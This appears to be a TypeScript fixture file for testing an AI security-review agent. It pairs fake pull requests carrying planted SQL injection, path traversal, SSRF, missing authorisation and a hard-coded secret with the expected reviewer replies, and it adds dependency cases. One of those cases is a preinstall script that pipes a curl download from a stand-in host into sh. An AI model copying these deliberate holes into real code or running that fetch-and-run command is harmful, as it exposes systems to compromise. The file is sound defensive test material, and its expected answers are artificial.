import { patch, type FakeFile } from "../../context/test-support";
import type { ExpectedFinding, FixtureReply } from "../codeReview/fixtures";

// Fixture pull requests for the Security agent (Phase 12): five seeded weaknesses, a benign change and the
// dependency cases. Used like the Code Review fixtures: offline tests feed each `reply` (what a good model returns)
// through the whole engine, and `npm run review:fixtures` (FIXTURES=security) sends the same diffs to a real
// provider and compares its answer with `expected`. Not exported from the package.
//
// The fake credential is built from parts so no scanner flags this file, and it is deliberately not one of the
// token formats Phase 5 redacts: the model sees it in the diff, as it would see a real hard-coded password.

export interface SecurityFixture {
  name: string;
  description: string;
  title: string;
  body: string;
  files: FakeFile[];
  expected: ExpectedFinding[];
  reply: FixtureReply;
}

/** A credential-shaped literal that no token rule matches. */
export const FAKE_SECRET = ["Zk3pQ9xV7mLw", "2RtB8nYd4HsC", "6JfA1eUg"].join("");

const added = (name: string, lines: string[]): FakeFile => ({
  filename: name,
  status: "added",
  additions: lines.length,
  deletions: 0,
  changes: lines.length,
  patch: patch(`@@ -0,0 +1,${lines.length} @@`, ...lines.map((line) => `+${line}`)),
});

/** A modified `package.json` whose hunk is given as diff lines (with their ` `, `+` or `-` prefixes). */
export const manifest = (hunkHeader: string, ...lines: string[]): FakeFile => ({
  filename: "package.json",
  status: "modified",
  additions: lines.filter((l) => l.startsWith("+")).length,
  deletions: lines.filter((l) => l.startsWith("-")).length,
  changes: lines.length,
  patch: patch(hunkHeader, ...lines),
});

const found = (over: Record<string, unknown>) => ({
  category: "security",
  severity: "high",
  confidence: 0.92,
  title: "",
  file_path: null,
  start_line: null,
  end_line: null,
  evidence: "",
  impact: "",
  recommendation: "",
  suggested_test: null,
  ...over,
});

export const SECURITY_FIXTURES: SecurityFixture[] = [
  {
    name: "sql-injection",
    description:
      "An unauthenticated search route builds its SQL from the query string (the critical fixture, AC-7).",
    title: "Add user search",
    body: "Public search by name.",
    files: [
      added("src/routes/users.ts", [
        'import express from "express";',
        'import { db } from "../db";',
        "",
        "export const users = express.Router();",
        "",
        'users.get("/search", async (req, res) => {',
        "  const name = String(req.query.name);",
        "  const rows = await db.query(`SELECT id, email FROM users WHERE name = '${name}'`);",
        "  res.json(rows);",
        "});",
      ]),
    ],
    expected: [{ path: "src/routes/users.ts", line: 8, tolerance: 1, category: "security" }],
    reply: {
      findings: [
        found({
          severity: "critical",
          confidence: 0.96,
          title: "SQL query built from request data on a public route",
          file_path: "src/routes/users.ts",
          start_line: 8,
          end_line: 8,
          evidence:
            "const rows = await db.query(`SELECT id, email FROM users WHERE name = '${name}'`);",
          impact:
            "Anyone can change the meaning of the query through the name parameter, so the database contents of every user can be read or altered without signing in.",
          recommendation:
            "Use a parameterised query (`db.query('SELECT id, email FROM users WHERE name = $1', [name])`) and never build SQL from request values.",
        }),
      ],
      observations: [],
    },
  },

  {
    name: "path-traversal",
    description: "A download route joins a query parameter onto the uploads directory unchecked.",
    title: "Serve uploaded files",
    body: "Adds /download.",
    files: [
      added("src/routes/files.ts", [
        'import path from "node:path";',
        'import express from "express";',
        "",
        'const UPLOADS = path.resolve("uploads");',
        "export const files = express.Router();",
        "",
        'files.get("/download", (req, res) => {',
        "  const target = path.join(UPLOADS, String(req.query.file));",
        "  res.sendFile(target);",
        "});",
      ]),
    ],
    expected: [{ path: "src/routes/files.ts", line: 8, tolerance: 1, category: "security" }],
    reply: {
      findings: [
        found({
          severity: "high",
          confidence: 0.93,
          title: "File path built from a request parameter without a containment check",
          file_path: "src/routes/files.ts",
          start_line: 8,
          end_line: 9,
          evidence: "const target = path.join(UPLOADS, String(req.query.file));",
          impact:
            "A caller can make the server read files outside the uploads directory, including configuration and keys on the host.",
          recommendation:
            "Resolve the joined path and refuse it unless it stays inside the uploads directory, or map ids to files instead of accepting names.",
        }),
      ],
      observations: [],
    },
  },

  {
    name: "hard-coded-token",
    description:
      "A payment secret is committed as a string literal. The reply quotes it as evidence, which must not be published.",
    title: "Add billing client",
    body: "Stripe client for invoices.",
    files: [
      added("src/billing/client.ts", [
        'import Stripe from "stripe";',
        "",
        `const apiSecret = "${FAKE_SECRET}";`,
        "export const billing = new Stripe(apiSecret);",
      ]),
    ],
    expected: [{ path: "src/billing/client.ts", line: 3, tolerance: 0, category: "security" }],
    reply: {
      findings: [
        found({
          severity: "critical",
          confidence: 0.97,
          title: "Hard-coded payment API secret",
          file_path: "src/billing/client.ts",
          start_line: 3,
          end_line: 3,
          evidence: `const apiSecret = "${FAKE_SECRET}";`,
          impact:
            "Anyone with read access to the repository, its forks or its history can use the secret to act on the payment account.",
          recommendation:
            "Rotate the secret now, read it from the environment or a secret manager, and remove it from the git history.",
        }),
      ],
      observations: [],
    },
  },

  {
    name: "missing-authorisation",
    description:
      "One route of the router requires a signed-in user and the new delete route does not.",
    title: "Add order deletion",
    body: "DELETE /orders/:id.",
    files: [
      added("src/routes/orders.ts", [
        'import express from "express";',
        'import { requireAuth } from "../auth";',
        'import { db } from "../db";',
        "",
        "export const orders = express.Router();",
        "",
        'orders.get("/:id", requireAuth, async (req, res) => {',
        "  const order = await db.orders.find(req.params.id);",
        "  res.json(order);",
        "});",
        "",
        'orders.delete("/:id", async (req, res) => {',
        "  await db.orders.remove(req.params.id);",
        "  res.status(204).end();",
        "});",
      ]),
    ],
    expected: [{ path: "src/routes/orders.ts", line: 12, tolerance: 1, category: "security" }],
    reply: {
      findings: [
        found({
          severity: "high",
          confidence: 0.9,
          title: "Order deletion route has no authentication or ownership check",
          file_path: "src/routes/orders.ts",
          start_line: 12,
          end_line: 15,
          evidence: 'orders.delete("/:id", async (req, res) => {',
          impact:
            "The read route in the same router requires a signed-in user, this one does not, so anyone who can reach the service can delete any order by id.",
          recommendation:
            "Add `requireAuth` and check that the order belongs to the caller before removing it.",
        }),
      ],
      observations: [],
    },
  },

  {
    name: "ssrf",
    description: "A preview endpoint fetches whatever URL the client posts.",
    title: "Add link preview",
    body: "Fetches a page for the preview card.",
    files: [
      added("src/routes/preview.ts", [
        'import express from "express";',
        "",
        "export const preview = express.Router();",
        "",
        'preview.post("/preview", async (req, res) => {',
        "  const response = await fetch(req.body.url);",
        "  res.send(await response.text());",
        "});",
      ]),
    ],
    expected: [{ path: "src/routes/preview.ts", line: 6, tolerance: 1, category: "security" }],
    reply: {
      findings: [
        found({
          severity: "high",
          confidence: 0.91,
          title: "Server-side request to a URL supplied by the client",
          file_path: "src/routes/preview.ts",
          start_line: 6,
          end_line: 6,
          evidence: "const response = await fetch(req.body.url);",
          impact:
            "A caller can make the server request internal addresses and cloud metadata services and read the answers back.",
          recommendation:
            "Accept only http(s) URLs, resolve the host and refuse private, loopback and link-local addresses, and do not follow redirects blindly.",
        }),
      ],
      observations: [],
    },
  },

  {
    name: "benign-change",
    description: "A pure formatting helper: nothing to report.",
    title: "Add currency formatter",
    body: "Formats cents for display.",
    files: [
      added("src/format.ts", [
        'export function formatCurrency(cents: number, currency = "EUR"): string {',
        '  return new Intl.NumberFormat("en", { style: "currency", currency }).format(cents / 100);',
        "}",
      ]),
    ],
    expected: [],
    reply: { findings: [], observations: [] },
  },
];

export interface DependencyFixture {
  name: string;
  description: string;
  files: FakeFile[];
  /** Titles (or parts of them) the dependency rules must produce, with the line of the added entry. */
  expected: Array<{ line: number; title: string }>;
}

export const DEPENDENCY_FIXTURES: DependencyFixture[] = [
  {
    name: "new-install-script",
    description: "A `postinstall` script is added to the manifest.",
    files: [
      manifest(
        "@@ -5,6 +5,7 @@",
        '   "scripts": {',
        '     "build": "tsc",',
        '+    "postinstall": "node scripts/setup.js",',
        '     "test": "vitest run"',
        "   },",
        '   "dependencies": {',
        '     "express": "^4.19.2"',
      ),
    ],
    expected: [{ line: 7, title: "New `postinstall` install script" }],
  },
  {
    name: "install-script-that-downloads",
    description: "The install script pipes a download into a shell.",
    files: [
      manifest(
        "@@ -5,5 +5,6 @@",
        '   "scripts": {',
        '+    "preinstall": "curl -s https://setup.example.test/run.sh | sh",',
        '     "test": "vitest run"',
        "   }",
      ),
    ],
    expected: [
      { line: 6, title: "New `preinstall` install script that downloads or evaluates code" },
    ],
  },
  {
    name: "git-url-dependency",
    description: "A dependency comes from a git branch.",
    files: [
      manifest(
        "@@ -8,5 +8,6 @@",
        '   "dependencies": {',
        '     "express": "^4.19.2",',
        '+    "internal-utils": "git+https://github.com/acme/internal-utils.git#main",',
        '     "zod": "^4.6.5"',
        "   }",
      ),
    ],
    expected: [
      {
        line: 10,
        title: "Dependency `internal-utils` comes from a git repository without a pinned commit",
      },
    ],
  },
  {
    name: "misspelled-dependency",
    description: "A new dependency is one letter away from lodash.",
    files: [
      manifest(
        "@@ -8,4 +8,5 @@",
        '   "dependencies": {',
        '     "express": "^4.19.2",',
        '+    "lodahs": "^4.17.21"',
        "   }",
      ),
    ],
    expected: [{ line: 10, title: "New dependency `lodahs` looks like a misspelling of `lodash`" }],
  },
  {
    name: "ordinary-dependency-changes",
    description:
      "A new well-known package, a version bump, a pinned git commit and a moved line: no rule fires.",
    files: [
      manifest(
        "@@ -8,7 +8,8 @@",
        '   "dependencies": {',
        '-    "express": "^4.18.0",',
        '+    "express": "^4.19.2",',
        '+    "pinned-lib": "git+https://github.com/acme/pinned-lib.git#0123456789abcdef0123456789abcdef01234567",',
        '+    "zod": "^4.6.5",',
        '     "react": "^19.0.0"',
        "   },",
        '   "devDependencies": {',
      ),
    ],
    expected: [],
  },
];
